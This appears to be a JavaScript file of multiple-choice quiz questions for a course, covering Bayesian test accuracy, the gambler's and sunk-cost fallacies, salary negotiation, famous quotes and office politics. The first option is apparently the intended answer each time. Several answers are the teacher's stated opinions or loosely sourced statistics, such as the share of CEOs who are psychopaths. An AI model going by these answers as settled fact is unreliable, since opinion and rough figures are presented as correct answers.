    ["50%", "Height Bias", "determining average height in society by measuring the height of randomly-selected people"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "10% of the population suffers from an ailment and a test correctly predicts whether you have the ailment 90% of the time (10% failure rate).",
      "",
      "True Positive = (Have Ailment)*(Test Correct) = (0.1)*(0.9) = 0.09 (9%)",
      "True Negative = (Don't Have Ailment)*(Test Correct) = (0.9)*(0.9) = 0.81 (81%)",
      "False Positive = (Don't Have Ailment)*(Test Incorrect) = (0.9)*(0.1) = 0.09 (9%)",
      "False Negative = (Have Ailment)*(Test Incorrect) = (0.1)*(0.1) = 0.01 (1%)"
    ]),
  "If you test positive, you have a %s chance of having the ailment.",
  [
    ["50%"],
    ["100%"],
    ["0%"],
    ["25%"],
    ["75%"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "You've flipped a fair coin 10 times and it has landed on heads each time."
    ]),
  "You have a %s chance of getting a heads if you flip the coin again, thinking otherwise means that you've fallen for the \"%s\".",
  [
    ["50%", "Gambler's Fallacy"],
    ["100%", "Loser's Fallacy"],
    ["0%", "Winner's Fallacy"],
    ["0%", "Hot-Hand Fallacy"],
    ["100%", "Alternate Mind Scenario"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Quote from Chester Karrass -"
    ]),
  "\"You %s get what you %s. %s.\"",
  [
    ["don't get", "deserve", "You get what you negotiate"],
    ["do get", "deserve", "Life is fair"],
    ["do", "earn", "Pay is based on productivity"],
    ["only", "get care about", "So try hard"],
    ["will", "strive for", "Achievement is an accurate measure of honest work"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Legend of John Henry - John Henry was legendary for driving holes into rocks, but powerful machines came along that threatened his job."
    ]),
  "He %s one of the machines %s, but %s.",
  [
    ["challenged", "to a contest and won", "died of exhaustion"],
    ["used", "to do his work", "but never got paid"],
    ["broke", "with his hands", "other machines carried on with the work"],
    ["sold", "to a competitor", "the machine didn't work"],
    ["built", "and received a patent for it", "someone stole his intellectual property"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://www.bankrate.com/finance/college-finance/how-much-college-debt-is-too-much-1.aspx"
    ],
    null),
  "%s graduate undergraduate college with %s.",
  [
    ["Don't", "more debt than your starting salary"],
    ["It's okay to", "lots of debt so long as you pursue your dreams"],
    ["When you", "a STEM degree you will be set"],
    ["When you", "an extensive network of contacts you can skip job fairs"],
    ["After you", "an important internship on your resume you should easily be able to get a job"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://pubmed.ncbi.nlm.nih.gov/25774679/"
    ],
    null),
  "'Finally, %s was observed across individuals who differed in culture, gender, age, and personality, supporting %s.'",
  [
    ["the importance of status", "the universality of the status motive"],
    ["love of soccer", "its title as The Beautiful Game"],
    ["interest in love stories", "the thought that shows about love will always be made"],
    ["desire to eat pizza", "the notion that it is one of the top foods"],
    ["interest in science", "universal curiosity"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Joke by Comedian Rich Hall"
    ]),
  "\"When you go to work, if your name is on the building, you're %s. If your name is on your desk, you're %s. If your name is on your shirt, you're %s.\"",
  [
    ["rich", "middle-class", "poor"],
    ["a doctor", "an accountant", "an entrepreneur"],
    ["a politician", "the CEO", "a boxer"],
    ["in debt", "in luck", "in good health"],
    ["in heaven", "on Earth", "in jail"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://money.usnews.com/money/blogs/outside-voices-careers/2014/09/17/dont-believe-these-8-job-search-myths"
    ],
    null),
  "\"%s of people land jobs through %s.\"",
  [
    ["More than 70 percent", "networking"],
    ["About 20 percent", "networking"],
    ["About 50 percent", "job sites"],
    ["About 60 percent", "job sites"],
    ["More than 70 percent", "job sites"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://www.theatlantic.com/business/archive/2015/11/zoning-laws-and-the-rise-of-economic-inequality/417360/"
    ],
    null),
  "Zoning regulations (%s) hurt %s.",
  [
    ["which raise the price of rent and home ownership", "the young and the poor"],
    ["which determine elevator capacity", "the salaries of elevator inspectors"],
    ["which are crafted by judicious members of city council", "have everyone's interests in mind"],
    ["and pollution", "commute times"],
    ["for sports arenas", "the expansion of professional sports teams"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(["Reference - https://www.getrichslowly.org/you-can-negotiate-anything/"], null),
  "The %s of any negotiation %s.",
  [
    ["3 components", "are power, information, and time"],
    ["2 components", "are charm and determination"],
    ["only component", "is money"],
    ["endgame", "is to make more money"],
    ["3 components", "preparation, demands, and achievement"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "A way you can help yourself in a negotiation by (A) %s and (B) %s.",
  [
    ["having acceptable alternatives (known as BATNAs)", "having limited interest (especially emotional interest)"],
    ["really caring about what you want", "not caring about alternatives"],
    ["telling everyone ahead of time that you must go through with the negotiation", "repeatedly calling the other party"],
    ["hiring awesome negotiators", "bypassing those negotiators by talking to the other party directly"],
    ["respect the outward motives of the other party without question", "enter the negotiation without preparation (wing it)"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Source - Teacher's Strong (Reluctant) Opinion",
      "",
      "You return to your rented apartment after a long day at work to find your unemployed roommate resting comfortably on the couch watching TV and ignoring the unwashed dishes in the sink."
    ]),
  "In this situation, %s",
  [
    ["your roommate is the winner! Watch out for mediocre people!"],
    ["your roommate is a a total loser."],
    ["you should call the roommate's parents."],
    ["you should spend time with your roommate patiently explaining the importance of having a job to pay his/her share of the rent"],
    ["you should plead with your roommate to go find a job"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Source - Old Saying"
    ]),
  "\"A %s thinks %s before saying %s.\"",
  [
    ["diplomat", "twice", "nothing"],
    ["politician", "nothing", "something"],
    ["boaster", "little", "everything"],
    ["scientist", "carefully", "a new theory"],
    ["great speaker", "emotionally", "great things"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Quote from President Eisenhower -"
    ]),
  "\"%s are useless but %s is indispensable.\"",
  [
    ["Plans", "planning"],
    ["Tanks", "airplanes"],
    ["Speeches", "action"],
    ["Followers", "a leader"],
    ["Budgets", "money"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "You can help yourself in a negotiation by (A) %s and (B) %s.",
  [
    ["being well-rested", "not waiting to the last minute begin it"],
    ["waiting to the last moment to start so that you have a concise strategy", "be impatient"],
    ["use the time zone of the other party", "give quick answers to complicated questions"],
    ["telling the other party your deadline", "scheduling a meeting real early in the morning"],
    ["showing up late", "(if you travelled to the other party's office) announce your departure time"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Consider this scenario -",
      "",
      "After searching the internet for hours, you find the basketball you want is sold at Store A for $29. You then call that store and wait on hold for 30 minutes to confirm when the store is open. Just as you step into your car, your spouse tells you that Store B is open and sells the same basketball for $28."
    ]),
  "To avoid the 'Sunk-Cost Fallacy', you should %s.",
  [
    ["go to Store B to buy the basketball"],
    ["go to Store A to buy the basketball"],
    ["go buy another type of basketball at Store A"],
    ["go buy another type of basketball at Store B"],
    ["forget about buying the basketball"],
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Consider this scenario -",
      "",
      "You've been given a job offer as a junior software engineer and are trying to negotiate your salary.",
      "The average annual salary for this position is $70K but the employer initiates the negotiation by stating they'll offer $60K.",
    ]),
  "Your future employer is using the negotiating technique of '%s'.",
  [
    ["anchoring"],
    ["say them cheap"],
    ["clueless"],
    ["stifling"],
    ["initiating"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Consider this corporate scenario where you, as a junior developer, are discussing technologies with the team -",
      "",
      "Technical Lead - We should use Java for this project.",
      "You - I just read a great article about how Python is a better language and Java isn't that great. We should use Python.",
      "Manager - We will use Java for the project."
    ]),
  "You should answer by saying '%s'",
  [
    ["Java's a great language and I always love the opportunity to learn new things."],
    ["No, I’m the developer and I get to decide."],
    ["No, I'll go talk to the director about this."],
    ["No, Java's an outdated language."],
    ["No, this team deserves better technical leadership."]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Source - Teacher's Informed Opinion"
    ]),
  "Corporate employees are usually assigned to job classes and associated '%s'. Since bosses often cannot radically change someone's pay the boss may reward that person with %s.",
  [
    ["salary bands", "better job responsibilities and public flattery"],
    ["price points", "a corner office and a plaque in the building lobby"],
    ["privilege group", "a firm handshake and a company shirt"],
    ["money tier", "special computer privileges"],
    ["bonus base", "a special party in your honor"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://www.joelonsoftware.com/2006/10/25/the-guerrilla-guide-to-interviewing-version-30/"
    ],
    null),
  "According to Joel Spolsky, managers want software engineers who are '%s' .",
  [
    ["smart and gets things done"],
    ["great corporate politicians"],
    ["understand Windows but not necessarily Unix"],
    ["smooth talkers"],
    ["speak loudly and interrupt other team members"]
  ]
);
addSingleQuestionToVerbal(
  null,
  "'%s' is where the lowest ranking performers within a job title are periodically laid off.",
  [
    ["Rank and yank"],
    ["Maniac culture"],
    ["Losers must leave"],
    ["Hatchet job"],
    ["Melt the iceberg"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    [
      "Reference - https://www.forbes.com/sites/jackmccullough/2019/12/09/the-psychopathic-ceo/"
    ],
    null),
  "About %s of CEOs are %s.",
  [
    ["10%", "psychopaths"],
    ["70%", "psychopaths"],
    ["50%", "women"],
    ["80%", "blond"],
    ["20%", "high-school dropouts"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Quote from Pro-Smoking Lobbyist Nick Naylor in Comedy \"Thank You for Smoking\" -"
    ]),
  "\"Everyone's got %s.\"",
  [
    ["a mortgage to pay"],
    ["someone that loves them"],
    ["a bad side"],
    ["a vice"],
    ["to do their part"]
  ]
);
addSingleQuestionToVerbal(
  createPreamble(
    null,
    [
      "Source - Teacher's Life Experience"
    ]),
  "Teacher's wife %s.",
  [
    ["got laid off in December 2002 just days before she received her annual bonus"],
    ["received an unexpected promotion to celebrate the new year"],
    ["qualified for specialized training that allowed her to apply for a new job position"],
    ["participated in an elaborate office holiday party"],
    ["got her student-loan debt paid off by her employer because of her great job performance"]
  ]
);
